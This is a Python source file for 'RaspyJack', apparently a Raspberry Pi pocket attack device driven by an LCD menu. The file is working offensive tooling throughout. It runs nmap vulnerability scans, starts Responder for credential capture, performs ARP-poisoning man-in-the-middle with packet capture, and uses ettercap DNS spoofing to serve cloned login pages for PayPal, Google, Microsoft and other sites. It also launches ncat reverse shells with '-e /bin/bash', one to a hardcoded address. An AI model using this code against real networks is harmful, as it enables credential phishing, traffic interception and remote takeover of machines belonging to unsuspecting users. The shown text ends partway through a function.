#!/usr/bin/env python3

import os
import subprocess
import netifaces # type: ignore
from datetime import datetime
import threading, time, json
from PIL import Image, ImageDraw, ImageFont
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO # type: ignore
from functools import partial
import time
import sys
from ui.widgets import (
    WidgetContext,
    dialog,
    dialog_info,
    yn_dialog,
    ip_value_picker,
    color_picker,
    scrollable_text_lines,
    explorer,
    browse_images,
)
from ui.status_bar import StatusBar
from ui.color_scheme import ColorScheme
from ui.menu import Menu, MenuItem, CheckboxMenuItem, ListRenderer, GridRenderer, CarouselRenderer
from ui.framebuffer import fb
from input_events import init_button_events, get_button_event as _evt_get_button_event

# https://www.waveshare.com/wiki/File:1.44inch-LCD-HAT-Code.7z

# --- Plugin system ---------------------------------------------
try:
    from plugins.base import PluginManager
except Exception as _plug_exc:  # allow running without plugins
    PluginManager = None
    print(f"[PLUGIN] Plugin system not available: {_plug_exc}")

# WiFi Integration - Add dual interface support
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import (
        get_best_interface, 
        get_interface_ip, 
        get_nmap_target_network,
        get_mitm_interface,
        get_responder_interface,
        get_dns_spoof_ip,
    )
    WIFI_AVAILABLE = True
    print("✅ WiFi integration loaded - dual interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    print("   Using ethernet-only mode")
    WIFI_AVAILABLE = False
    
    # Fallback functions for ethernet-only mode
    def get_best_interface():
        return "eth0"
    def get_interface_ip(interface):
        try:
            return subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'", shell=True).decode().strip().split('/')[0]
        except:
            return None
    def get_nmap_target_network():
        try:
            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / { print $2 }'", shell=True).decode().strip()
        except:
            return None
    def get_mitm_interface():
        return "eth0"
    def get_responder_interface():
        return "eth0"  
    def get_dns_spoof_ip():
        try:
            return subprocess.check_output("ip -4 addr show eth0 | awk '/inet / {split($2, a, \"/\"); print a[1]}'", shell=True).decode().strip()
        except:
            return None
    def set_raspyjack_interface(interface):
        print(f"⚠️  WiFi integration not available - cannot switch to {interface}")
        return False
_stop_evt = threading.Event()
screen_lock = threading.Event()

status_bar = StatusBar()

def _compute_activity_status() -> str:
    try:
        devnull = subprocess.DEVNULL
        call = subprocess.call
        if call(['pgrep', '-x', 'nmap'], stdout=devnull, stderr=devnull) == 0:
            return "(Scan in progress)"
        if 'is_mitm_running' in globals() and callable(is_mitm_running) and is_mitm_running():
            return "(MITM & sniff)"
        if call(['pgrep', '-x', 'ettercap'], stdout=devnull, stderr=devnull) == 0:
            return "(DNSSpoof)"
        if 'is_responder_running' in globals() and callable(is_responder_running) and is_responder_running():
            return "(Responder)"
    except Exception:
        pass
    return ""

def _stats_update_loop():
    """Background thread that updates stats at fixed interval regardless of render FPS."""
    while not _stop_evt.is_set():
        activity = _compute_activity_status()
        status_bar.set_activity(activity)
        time.sleep(2.0)

def _render_loop():
    """Update stats (if needed) and render overlays."""
    TICK = 0.1  # ~10 FPS overlay
    while not _stop_evt.is_set():
        if screen_lock.is_set():  # UI frozen by payload
            time.sleep(0.2)
            continue
        # Snapshot current base frame from FrameBuffer
        frame = fb.snapshot()
        draw_frame = ImageDraw.Draw(frame)
        # Draw status/temperature bar via StatusBar helper
        status_bar.render(draw_frame, font)

        # Plugins overlays
        if '_plugin_manager' in globals() and _plugin_manager is not None:
            try:
                overlay = _plugin_manager.get_overlay()
                if overlay is not None:
                    try:
                        frame.paste(overlay, (0, 0), overlay)
                    except Exception:
                        pass
                else:
                    _plugin_manager.dispatch_render_overlay(frame, draw_frame)
            except Exception:
                pass

        # Push to LCD
        try:
            LCD.LCD_ShowImage(frame, 0, 0)
        except Exception:
            pass
        time.sleep(TICK)

def start_background_loops():
    threading.Thread(target=_stats_update_loop, daemon=True).start()
    threading.Thread(target=_render_loop, daemon=True).start()
    threading.Thread(target=_plugin_tick_loop, daemon=True).start()

def _plugin_tick_loop():
    """Dedicated loop for plugin ticks so they continue while screen_lock is set."""
    TICK_INTERVAL = 0.5  # rate limit ticks to reduce CPU usage
    while not _stop_evt.is_set():
        if '_plugin_manager' in globals() and _plugin_manager is not None:
            try:
                _plugin_manager.dispatch_tick()
                _plugin_manager.rebuild_overlay(size=(LCD.width, LCD.height))
            except Exception:
                pass
        time.sleep(TICK_INTERVAL)

if os.getuid() != 0:
        print("You need a sudo to run this!")
        exit()
print(" ")
print(" ------ RaspyJack Started !!! ------ ")
start_time = time.time()

####### Classes except menu #######
### Global mostly static values ###
class Defaults():
    start_text = [12, 22]
    text_gap = 14

    updown_center = 52
    updown_pos = [15, updown_center, 88]

    imgstart_path = "/root/"

    install_path = "/root/Raspyjack/"
    config_file = install_path + "gui_conf.json"

    payload_path = install_path + "payloads/"
    payload_log  = install_path + "loot/payload.log"


### Color scheme ###
color: "ColorScheme"  # forward annotation for linters
 

####### Simple methods #######
### Get any button press ###
def get_button():
    while True:
        now_t = time.time()
        for item, pin in gpio_config.pins.items():
            val = GPIO.input(pin)
            if item in EDGE_BUTTONS:
                prev = _button_prev.get(item, 1)
                if prev == 1 and val == 0:  # transition to pressed
                    last_t = _button_last_time.get(item, 0)
                    if (now_t - last_t) >= _DEBOUNCE_INTERVAL:
                        _button_last_time[item] = now_t
                        _button_prev[item] = val
                        if '_plugin_manager' in globals() and _plugin_manager is not None:
                            pass  # Legacy dispatch removed (event manager handles PRESS)
                        return item
                _button_prev[item] = val
            else:
                if val == 0:
                    # Legacy immediate dispatch removed
                    return item
        time.sleep(0.01)


def get_button_no_edge():
    """Return first pressed button (level detection) without edge debouncing.

    Useful for widgets (like passive text scrollers) that want continuous
    press sampling (e.g., holding UP should repeatedly scroll) without the
    single-edge gating applied in `get_button` for directional keys.

    Still applies a minimal debounce interval for all buttons to avoid
    overwhelming the UI thread on sustained contact bounce.
    """
    while True:
        now_t = time.time()
        for item, pin in gpio_config.pins.items():
            val = GPIO.input(pin)
            if val == 0:  # active low pressed
                last_t = _button_last_time.get(item, 0)
                if (now_t - last_t) >= _DEBOUNCE_INTERVAL:
                    _button_last_time[item] = now_t
                    if '_plugin_manager' in globals() and _plugin_manager is not None:
                        pass  # Event manager provides continuous events
                    return item
        time.sleep(0.01)


def leave(poweroff: bool = False) -> None:
    _stop_evt.set()
    if '_plugin_manager' in globals() and _plugin_manager is not None:
        try:
            _plugin_manager.unload_all()
        except Exception:
            pass
    GPIO.cleanup()
    if poweroff:
        os.system("sync && poweroff")
    print("Bye!")
    sys.exit(0)


def restart_ui():
    print("Restarting the UI!")
    dialog(_widget_context, "Restarting!", False)
    arg = ["-n","-5",os.sys.executable] + sys.argv
    os.execv(os.popen("whereis nice").read().split(" ")[1], arg)
    leave()


def safe_kill(*names):
    for name in names:
        subprocess.run(
            ["pkill", "-9", "-x", name],      # -x = exact name match
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

### Two threaded functions ###
# One for updating status bar and one for refreshing display #
def is_responder_running():
    time.sleep(1)
    ps_command = "ps aux | grep Responder.py | grep -v grep | awk '{print $2}'"
    try:
        output = subprocess.check_output(ps_command, shell=True)
        pid = int(output.strip())
        return True
    except (subprocess.CalledProcessError, ValueError):
        return False

def is_mitm_running():
    time.sleep(1)
    tcpdump_running = subprocess.call(['pgrep', 'tcpdump'], stdout=subprocess.DEVNULL) == 0
    arpspoof_running = subprocess.call(['pgrep', 'arpspoof'], stdout=subprocess.DEVNULL) == 0
    return tcpdump_running or arpspoof_running


def save_config() -> None:
    data = {
        "PINS": gpio_config.pins,
        "PATHS": {"IMAGEBROWSER_START": default.imgstart_path},
        "COLORS": color.to_dict(),
    }
    print(json.dumps(data, indent=4, sort_keys=True))
    with open(default.config_file, "w") as wf:
        json.dump(data, wf, indent=4, sort_keys=True)
    
    # Update the gpio_config module's internal state to keep it in sync
    gpio_config._config_data = data
    gpio_config._pins = data["PINS"]

    print("Config has been saved!")
    dialog_info(_widget_context, "Config saved!", wait=True, center=True)



def load_config():
    global default

    if not (os.path.exists(default.config_file) and os.path.isfile(default.config_file)):
        print("Can't find a config file! Creating one at '" + default.config_file + "'...")
        save_config()

    # Reload GPIO configuration
    gpio_config.load_config()

    with open(default.config_file, "r") as rf:
        data = json.load(rf)
        default.imgstart_path = data["PATHS"].get("IMAGEBROWSER_START", default.imgstart_path)
        
        # Colors are still loaded from the config file
        try:
            color.load_dict(data["COLORS"])
        except:
            pass
            
        # Setup GPIO
        GPIO.setmode(GPIO.BCM)
        for pin_name, pin_number in gpio_config.pins.items():
            GPIO.setup(pin_number, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    print("Config loaded!")

from plugins.runtime import (
    load_plugins_conf as _rt_load_plugins_conf,
    save_plugins_conf as _rt_save_plugins_conf,
    reload_plugins as _rt_reload_plugins,
    install_pending_plugin_archives as _rt_install_archives,
)

def reload_plugins():
    """Reload plugins using runtime helper."""
    global _plugin_manager
    if 'PluginManager' not in globals() or PluginManager is None:
        return
    ctx = {
        'exec_payload': lambda name: exec_payload(name),
        'is_responder_running': is_responder_running,
        'is_mitm_running': is_mitm_running,
        'draw_image': lambda: image,
        'draw_obj': lambda: draw,
        'status_bar': status_bar,
        'get_button_event': _evt_get_button_event,
        # Placeholders (filled after WidgetContext is created in main())
        'widget_context': None,
        'plugin_manager': None,
        'defaults': None
    }
    _plugin_manager = _rt_reload_plugins(_plugin_manager, default.install_path, ctx)

####### Drawing functions #######

### Initializations ###
# This block must be at the top to ensure all hardware and config are ready before use.
default = Defaults()

LCD = LCD_1in44.LCD()
Lcd_ScanDir = LCD_1in44.SCAN_DIR_DFT
LCD.LCD_Init(Lcd_ScanDir)
LCD_Config.Driver_Delay_ms(5)
image = Image.open(default.install_path + 'img/logo.bmp')
LCD.LCD_ShowImage(image, 0, 0)

# Create draw objects and fonts
image = Image.new("RGB", (LCD.width, LCD.height), "WHITE")
draw = ImageDraw.Draw(image)
fb.init(image)
text_font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf', 9)
icon_font = ImageFont.truetype('/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf', 12)
font = text_font

# GPIO configuration
from gpio_config import gpio_config

# Edge-detected logical buttons.
EDGE_BUTTONS = {
    "KEY1_PIN",
    "KEY2_PIN",
    "KEY3_PIN",
    "KEY_PRESS_PIN",
    "KEY_LEFT_PIN",
    "KEY_RIGHT_PIN",
    "KEY_UP_PIN",
    "KEY_DOWN_PIN",
}
_button_prev = {}
_button_last_time = {}
_DEBOUNCE_INTERVAL = 0.18  # seconds min interval between presses

# Instantiate the global color scheme
color = ColorScheme(draw_ref=lambda: draw)

# Load config
load_config()

# Initialize previous states for edge-detected buttons
for _bn, _pin in gpio_config.pins.items():
    if _bn in EDGE_BUTTONS:
        try:
            _button_prev[_bn] = GPIO.input(_pin)
        except Exception:
            _button_prev[_bn] = 1  # assume released

# Global widget context - will be initialized in main()
_widget_context = None

# ============================================================================
# All action and helper functions are defined here, BEFORE the MenuManager
# class that uses them. This resolves NameError issues at definition time.
# ============================================================================

def _interactive_selector(context: WidgetContext, items: list, title: str = "Select an option"):
    """
    A generic, reusable, interactive list selector using the new menu system.
    This is the replacement for the old GetMenuString function.
    """
    if not items:
        dialog_info(context, "Nothing to show.", wait=True)
        return None

    # Create a list of MenuItem objects for the interactive menu
    menu_items = [MenuItem(str(item), str(item)) for item in items]
    
    # Use a temporary menu instance for the selection process
    renderer = ListRenderer(context)
    menu = Menu(context, renderer)
    menu.set_items(menu_items)
    menu.set_title(title)

    # Run the menu interactively and capture the selected value.
    # The user can exit with the left key or key3, which returns None.
    selected_value = menu.run_interactive(exit_keys=["KEY_LEFT_PIN", "KEY3_PIN"])
    
    return selected_value


def _browse_and_show_text_files(base_subpath: str, extensions: str, title: str):
    """Generic helper to browse a directory and display a selected text file.

    Loops until user exits explorer; handles read errors gracefully.
    base_subpath: path relative to install_path.
    extensions: pipe-separated list of allowed extensions.
    title: title shown in scrollable viewer.
    """
    root_path = os.path.join(default.install_path, base_subpath)
    while True:
        rfile = explorer(_widget_context, root_path, extensions=extensions)
        if not rfile:
            break
        fname = os.path.basename(rfile)
        if not yn_dialog(_widget_context, question="Open file?", yes_text="Yes", no_text="No", second_line=fname[:20]):
            continue
        try:
            with open(rfile, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().splitlines()
            scrollable_text_lines(_widget_context, content, title=title)
        except Exception as e:
            dialog_info(_widget_context, f"Error reading file:\n{e}", wait=True)

def read_text_file_nmap():
    _browse_and_show_text_files("loot/Nmap/", ".txt|.xml", "Nmap File")

def read_text_file_responder():
    _browse_and_show_text_files("Responder/logs/", ".log|.txt", "Responder Log")

def read_text_file_dnsspoof():
    _browse_and_show_text_files("DNSSpoof/captures/", ".log|.txt", "DNSSpoof Log")


def set_color(key: str) -> None:
    """Open the color picker widget for a specific theme color."""
    try:
        initial = color.get_color(key)
        picked = color_picker(_widget_context, initial_color=initial)
        if yn_dialog(
            _widget_context,
            question="Set color to?",
            yes_text="Yes",
            no_text="No",
            second_line=("    " + picked),
        ):
            color.set_color(key, picked)
            dialog_info(_widget_context, "Done!", wait=True, center=True)
    except Exception as e:
        dialog_info(_widget_context, f"Color Error: {e}", wait=True)

def show_info():
    """Display network information using the scrollable text viewer."""
    try:
        interface = get_best_interface()
        interface_ipv4 = get_interface_ip(interface)
        info_lines = [f"Interface: {interface}"]
        if interface_ipv4:
            interface_config = netifaces.ifaddresses(interface)
            interface_subnet_mask = interface_config[netifaces.AF_INET][0]['netmask']
            interface_gateway = netifaces.gateways()["default"][netifaces.AF_INET][0]
            info_lines.extend([
                f"IP: {interface_ipv4}",
                f"Subnet: {interface_subnet_mask}",
                "Gateway:",
                f"  {interface_gateway}",
            ])
            if interface.startswith('wlan') and WIFI_AVAILABLE:
                try:
                    from wifi.wifi_manager import wifi_manager
                    status = wifi_manager.get_connection_status(interface)
                    if status["ssid"]:
                        info_lines.extend(["SSID:", f"  {status['ssid']}"])
                except: pass
        else:
            info_lines.append("Status: No connection")
    except Exception as e:
        info_lines = ["Network Error", f"Details: {str(e)[:15]}..."]
    
    scrollable_text_lines(_widget_context, info_lines, title="Network Info")

WAIT_TXT = "Scan in progress..."

def run_scan(label: str, nmap_args: list[str]):
    if _event_bus is not None:
        try:
            _event_bus.emit("scan.before", label=label, args=nmap_args)
        except Exception:
            pass

    dialog_info(_widget_context, f"{label}\nRunning\nPlease wait...", wait=True, center=True)

    # Get target network from best available interface
    interface = get_best_interface()
    ip_with_mask = get_nmap_target_network(interface)
    
    if not ip_with_mask:
        dialog_info(_widget_context, "Network Error\nNo interface available", wait=True)
        return

    ts   = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    path = f"/root/Raspyjack/loot/Nmap/{label.lower().replace(' ', '_')}_{ts}.txt"

    # Build nmap command with interface specification
    cmd = ["nmap"] + nmap_args + ["-oN", path]
    
    # Add interface-specific parameters for better results
    interface_ip = get_interface_ip(interface)
    if interface_ip:
        cmd.extend(["-S", interface_ip, "-e", interface])
    
    cmd.append(ip_with_mask)
    
    subprocess.run(cmd)
    subprocess.run(["sed", "-i", "s/Nmap scan report for //g", path])

    if _event_bus is not None:
        try:
            _event_bus.emit("scan.after", label=label, args=nmap_args, result_path=path)
        except Exception:
            pass

    dialog_info(_widget_context, f"{label}\nFinished!\nInterface: {interface}", wait=True, center=True)
    time.sleep(2)


# ---------- main table Nmap arguments -----------------
SCANS = {
    "Quick Scan"            : ["-T5"],
    "Full Port Scan"        : ["-p-"],
    "Service Scan"          : ["-T5", "-sV"],
    "Vulnerability"         : ["-T5", "-sV", "--script", "vuln"],
    "Full Vulns"            : ["-p-", "-sV", "--script", "vuln"],
    "OS Scan"               : ["-T5", "-A"],
    "Intensive Scan"        : ["-O", "-p-", "--script", "vuln"],
    "Stealth SYN Scan"      : ["-sS", "-T4"],                        # Half-open scan, avoids full TCP handshake
    "UDP Scan"              : ["-sU", "-T4"],                        # Finds services that only speak UDP
    "Ping Sweep"            : ["-sn"],                               # Host discovery without port scanning
    "Top100 Scan"           : ["--top-ports", "100", "-T4"],         # Quick look at the most common ports
    "HTTP Enumeration"      : ["-p", "80,81,443,8080,8443", "-sV", "--script", "http-enum,http-title"],  # Fast web-focused recon
}


globals().update({
    f"scan_{k.lower().replace(' ', '_')}": partial(run_scan, k, v)
    for k, v in SCANS.items()
})



def defaut_reverse():
    # Get best available interface and its IP
    interface = get_best_interface()
    
    try:
        default_ip_bytes = subprocess.check_output(f"ip addr show dev {interface} | awk '/inet / {{ print $2 }}'|cut -d'.' -f1-3", shell=True)
        default_ip = default_ip_bytes.decode('utf-8').strip()
        default_ip_parts = default_ip.split(".")
        default_ip_prefix = ".".join(default_ip_parts[:3])
        new_value = ip_value_picker(_widget_context, default_ip_prefix, initial_value=1)
        target_ip = f"{default_ip_prefix}.{new_value}"
        nc_command = ['ncat', target_ip, '4444', '-e', '/bin/bash']
        print(f"Reverse shell launched on {target_ip} via {interface}!")
        process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
        dialog_info(_widget_context, f"Reverse shell launched!\nOn {target_ip}\nVia {interface}", wait=True, center=True)
        time.sleep(2)
    except Exception as e:
        dialog_info(_widget_context, f"Reverse Shell Error\nInterface: {interface}\nNo network?", wait=True)
        time.sleep(2)

def remote_reverse():
    nc_command = ['ncat','192.168.1.30','4444', '-e', '/bin/bash']
    process = subprocess.Popen(nc_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
    status_bar.set_temp_status("(Remote shell)", ttl=5)

def responder_on():
    check_responder_command = "ps aux | grep Responder | grep -v grep | cut -d ' ' -f7"
    check_responder_process = os.popen(check_responder_command).read().strip()
    if check_responder_process:
        subprocess.check_call(check_responder_command, shell=True)
        dialog_info(_widget_context, "Already running!", wait=True, center=True)
        time.sleep(2)
    else:
        # Get best interface for Responder
        interface = get_responder_interface()
        os.system(f'python3 /root/Raspyjack/Responder/Responder.py -Q -I {interface} &')
        dialog_info(_widget_context, f"Responder\nStarted!\nInterface: {interface}", wait=True, center=True)
        time.sleep(2)

def responder_off():
    os.system("killResponder=$(ps aux | grep Responder|grep -v 'grep'|awk '{print $2}')&&kill -9 $killResponder")
    dialog_info(_widget_context, "Responder\nStopped!", wait=True, center=True)
    time.sleep(2)


def get_default_gateway_ip():
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]

def get_local_network():
    default_gateway_ip = get_default_gateway_ip()
    ip_parts = default_gateway_ip.split('.')
    ip_parts[-1] = '0'
    return '.'.join(ip_parts) + '/24'

def start_mitm():
    safe_kill("arpspoof", "tcpdump")
    dialog_info(_widget_context, "Starting MITM & Sniff\nIn progress...\nPlease wait...", wait=True, center=True)
    
    # Get best interface for MITM attack
    interface = get_mitm_interface()
    local_network = get_local_network()
    print(f"[*] Starting MITM attack on local network {local_network} via {interface}...")

# Scan hosts on the network
    print("[*] Scanning hosts on network...")
    cmd = f"arp-scan --localnet --quiet|grep -v 'Interface\|Starting\|packets\|Ending'"
    result = os.popen(cmd).readlines()

# Display IP and MAC addresses of hosts
    hosts = []
    for line in result:
        parts = line.split()
        if len(parts) >= 2:
            hosts.append({'ip': parts[0], 'mac': parts[1]})
            print(f"[+] Host: {parts[0]} ({parts[1]})")

# Retrieve the gateway IP address
    gateway_ip = get_default_gateway_ip()
    print(f"[*] Default gateway IP: {gateway_ip}")

# If at least one host is found, launch the ARP MITM attack
    if len(hosts) > 1:
        print(f"[*] Launching ARP poisoning attack via {interface}...")
        for host in hosts:
            if host['ip'] != gateway_ip:
                subprocess.Popen(["arpspoof", "-i", interface, "-t", gateway_ip, host['ip']])
                subprocess.Popen(["arpspoof", "-i", interface, "-t", host['ip'], gateway_ip])
        print("[*] ARP poisoning attack complete.")

# Start tcpdump capture to sniff network traffic
        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        pcap_file = f"/root/Raspyjack/loot/MITM/network_traffic_{now}.pcap"
        print(f"[*] Starting tcpdump capture and writing packets to {pcap_file}...")
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        tcpdump_process = subprocess.Popen(["tcpdump", "-i", interface, "-w", pcap_file], stdout=subprocess.PIPE)
        tcpdump_process.stdout.close()
        dialog_info(_widget_context, f"MITM & Sniff\nOn {len(hosts)-1} hosts\nInterface: {interface}", wait=True, center=True)
        time.sleep(8)
    else:
        print("[-] No hosts found on network.")
        dialog_info(_widget_context, "ERROR\nNo hosts found", wait=True, center=True)
        time.sleep(2)

def stop_mitm():
    safe_kill("arpspoof", "tcpdump")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    time.sleep(2)
    status_bar.set_temp_status("(MITM stopped)", ttl=5)
    dialog_info(_widget_context, "MITM & Sniff\nStopped!", wait=True, center=True)
    time.sleep(2)


# Name of the currently spoofed site (used elsewhere in your code)
site_spoof = "wordpress"

def spoof_site(name: str):
    global site_spoof
    site_spoof = name

    dialog_info(_widget_context, f"Spoofing\n{name}!", wait=True, center=True)
    time.sleep(2)

    subprocess.run("pkill -f 'php'", shell=True)   # stop PHP instances
    time.sleep(1)

    webroot = f"/root/Raspyjack/DNSSpoof/sites/{name}"
    cmd = f"cd {webroot} && php -S 0.0.0.0:80"
    subprocess.Popen(cmd, shell=True)              # launch the built-in PHP

# Central list of sites to spoof: add/remove freely here
SITES = [
    "microsoft", "wordpress", "instagram", "google", "amazon", "apple",
    "twitter", "netflix", "spotify", "paypal", "linkedin", "snapchat",
    "pinterest", "yahoo", "steam", "adobe", "badoo", "icloud",
    "instafollowers", "ldlc", "origin", "playstation", "protonmail",
    "shopping", "wifi", "yandex",
]

site_spoof = "wordpress"
# Path to etter.dns file
ettercap_dns_file = "/etc/ettercap/etter.dns"


def start_dns_spoofing():
    # Get best interface for DNS spoofing
    interface = get_best_interface()
    
    # Get gateway and current IP automatically
    gateway_ip = subprocess.check_output("ip route | awk '/default/ {print $3}'", shell=True).decode().strip()
    current_ip = get_dns_spoof_ip(interface)
    
    if not current_ip:
        dialog_info(_widget_context, "DNS Spoof Error\nNo IP available", wait=True)
        return

# Escape special characters in the IP address for the sed command
    escaped_ip = current_ip.replace(".", r"\.")

    # Use sed to modify IP addresses in etter.dns file
    sed_command = f"sed -i 's/[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+/{escaped_ip}/g' {ettercap_dns_file}"
    subprocess.run(sed_command, shell=True)

    print("------------------------------- ")
    print(f"Site: {site_spoof}")
    print(f"Interface: {interface}")
    print(f"IP: {current_ip}")
    print("------------------------------- ")
    print("dns domain spoofed: ")
    dnsspoof_command = f"cat {ettercap_dns_file} | grep -v '#'"
    subprocess.run(dnsspoof_command, shell=True)
    print("------------------------------- ")

# Commands executed in the background
    website_command = f"cd /root/Raspyjack/DNSSpoof/sites/{site_spoof} && php -S 0.0.0.0:80"
    ettercap_command = f"ettercap -Tq -M arp:remote -P dns_spoof -i {interface}"
    dialog_info(_widget_context, f"DNS Spoofing\n{site_spoof} started!\nInterface: {interface}", wait=True, center=True)
    time.sleep(2)

# Execution of background commands
    website_process = subprocess.Popen(website_command, shell=True)
    ettercap_process = subprocess.Popen(ettercap_command, shell=True)


def stop_dns_spoofing():
    # Terminate website and ettercap processes
    subprocess.run("pkill -f 'php'", shell=True)
    subprocess.run("pkill -f 'ettercap'", shell=True)

    dialog_info(_widget_context, "DNS Spoofing\nStopped!", wait=True, center=True)
    time.sleep(2)

# --- WiFi Management Functions ---
def launch_wifi_manager():
    """Launch the FAST WiFi interface payload."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found\nRun wifi_manager_payload", wait=True)
        return
    
    dialog_info(_widget_context, "Loading FAST WiFi\nSwitcher...", wait=True)
    exec_payload("fast_wifi_switcher.py")

def show_interface_info_action():
    """Show detailed information about the current network interface."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        current_interface = get_best_interface()
        interface_ip = get_interface_ip(current_interface)
        
        info_lines = [
            f"Current: {current_interface}",
            f"IP: {interface_ip or 'None'}",
        ]
        
        if current_interface.startswith('wlan'):
            try:
                from wifi.wifi_manager import wifi_manager
                status = wifi_manager.get_connection_status(current_interface)
                if status["ssid"]:
                    info_lines.insert(2, f"SSID: {status['ssid']}")
            except:
                pass
        # Show using scrollable widget
        scrollable_text_lines(_widget_context, info_lines, title="Interface Info")
    except Exception as e:
        dialog_info(_widget_context, f"Interface Info Error\n{str(e)[:20]}", wait=True)

def switch_interface_menu():
    """Show a menu to switch the active WiFi interface for RaspyJack."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import (
            list_wifi_interfaces_with_status, 
            set_raspyjack_interface
        )
        
        wifi_interfaces = list_wifi_interfaces_with_status()
        
        if not wifi_interfaces:
            dialog_info(_widget_context, "No WiFi interfaces\nfound!", wait=True)
            return
        
        # Create menu entries showing interface status
        interface_list = []
        for iface_info in wifi_interfaces:
            name = iface_info['name']
            current_mark = ">" if iface_info['current'] else " "
            conn_status = "UP" if iface_info['connected'] else "DOWN"
            ip = iface_info['ip'] if iface_info['ip'] else "No IP"
            interface_list.append(f"{current_mark} {name} ({conn_status}) {ip}")
        
        selection = _interactive_selector(_widget_context, interface_list, "Select WiFi Interface")
        
        if selection:
            # Extract interface name (e.g., 'wlan0') from the selection string
            selected_iface = selection.split()[1]
            if selected_iface.startswith('wlan'):
                dialog_info(_widget_context, f"Switching to\n{selected_iface}...", wait=True, center=True)
                success = set_raspyjack_interface(selected_iface)
                if success:
                    dialog_info(_widget_context, f"✓ Switched to\n{selected_iface}", wait=True, center=True)
                else:
                    dialog_info(_widget_context, f"✗ Switch failed", wait=True, center=True)
        
    except Exception as e:
        dialog_info(_widget_context, f"Switch Error\n{str(e)[:20]}", wait=True)

def show_routing_status():
    """Show the system's current default route and which interface RaspyJack is using."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import get_current_default_route
        
        current_route = get_current_default_route()
        current_interface = get_best_interface()
        
        if current_route:
            info_lines = [
                "Routing Status:",
                f"Default: {current_route.get('interface', 'unknown')}",
                f"Gateway: {current_route.get('gateway', 'unknown')}",
                f"RaspyJack uses: {current_interface}",
            ]
        else:
            info_lines = [
                "Routing Status:",
                "No default route found",
                f"RaspyJack uses: {current_interface}",
            ]
        # Show using scrollable widget
        scrollable_text_lines(_widget_context, info_lines, title="Routing Status")
    except Exception as e:
        dialog_info(_widget_context, f"Routing Error\n{str(e)[:20]}", wait=True)

def switch_to_wifi():
    """Set the system's default route to go through the primary WiFi interface."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import get_available_interfaces, ensure_interface_default
        
        interfaces = get_available_interfaces()
        wifi_interfaces = [iface for iface in interfaces if iface.startswith('wlan')]
        
        if not wifi_interfaces:
            dialog_info(_widget_context, "No WiFi interfaces\nfound", wait=True)
            return
        
        wifi_iface = wifi_interfaces[0]
        dialog_info(_widget_context, f"Switching to WiFi\n{wifi_iface}\nPlease wait...", wait=True, center=True)
        
        success = ensure_interface_default(wifi_iface)
        
        if success:
            dialog_info(_widget_context, f"✓ Switched to WiFi\n{wifi_iface}", wait=True, center=True)
        else:
            dialog_info(_widget_context, f"✗ Switch failed", wait=True, center=True)
            
    except Exception as e:
        dialog_info(_widget_context, f"WiFi Switch Error\n{str(e)[:20]}", wait=True)

def switch_to_ethernet():
    """Set the system's default route to go through the Ethernet interface."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import ensure_interface_default
        dialog_info(_widget_context, "Switching to Ethernet\neth0\nPlease wait...", wait=True, center=True)
        
        success = ensure_interface_default("eth0")
        
        if success:
            dialog_info(_widget_context, "✓ Switched to Ethernet\neth0", wait=True, center=True)
        else:
            dialog_info(_widget_context, "✗ Switch failed", wait=True, center=True)
            
    except Exception as e:
        dialog_info(_widget_context, f"Ethernet Switch Error\n{str(e)[:20]}", wait=True)

def launch_interface_switcher():
    """Launch the dedicated interface switcher payload."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
    
    dialog_info(_widget_context, "Loading Interface\nSwitcher...", wait=True)
    exec_payload("interface_switcher_payload.py")

def quick_wifi_toggle():
    """A fast toggle to switch RaspyJack's active interface between wlan0 and wlan1."""
    if not WIFI_AVAILABLE:
        dialog_info(_widget_context, "WiFi system not found", wait=True)
        return
        
    try:
        from wifi.raspyjack_integration import (
            get_current_raspyjack_interface,
            set_raspyjack_interface
        )
        
        current = get_current_raspyjack_interface()
        target = 'wlan1' if current == 'wlan0' else 'wlan0'
        
        dialog_info(_widget_context, f"FAST SWITCH:\n{current} -> {target}", wait=True)
        
        success = set_raspyjack_interface(target)
        
        if success:
            dialog_info(_widget_context, f"✓ SWITCHED!\n{target} active", wait=True)
        else:
            dialog_info(_widget_context, f"✗ FAILED!\n{target} not ready", wait=True)
            
    except Exception as e:
        dialog_info(_widget_context, f"Error: {str(e)[:20]}", wait=True)

def _setup_gpio() -> None:
    """
    Resets GPIO pins to a known state and re-initializes the LCD driver.
    This is crucial for restoring the UI after a payload has run.
    """
    GPIO.setmode(GPIO.BCM)
    for pin in gpio_config.pins.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    global LCD, image, draw
    LCD = LCD_1in44.LCD()
